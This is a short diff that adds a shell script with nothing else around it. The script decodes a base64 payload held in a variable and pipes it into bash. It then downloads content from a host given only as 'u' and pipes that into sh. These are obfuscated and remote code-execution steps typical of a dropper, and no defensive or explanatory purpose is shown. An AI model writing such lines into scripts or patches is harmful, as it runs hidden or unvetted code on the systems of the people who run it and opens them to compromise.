@@ -1,0 +1,3 @@
+#!/bin/sh
+echo $P | base64 -d | bash
+curl u | sh
